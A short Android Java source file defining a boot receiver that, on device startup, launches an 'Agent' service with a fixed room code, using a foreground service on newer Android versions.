package com.mazkiplay.nusantara;
import android.content.*;
public class BootReceiver extends BroadcastReceiver{
 @Override public void onReceive(Context c,Intent i){Intent x=new Intent(c,Agent.class);x.putExtra("room","R7GK9QMZ");if(android.os.Build.VERSION.SDK_INT>=26)c.startForegroundService(x);else c.startService(x);}
}
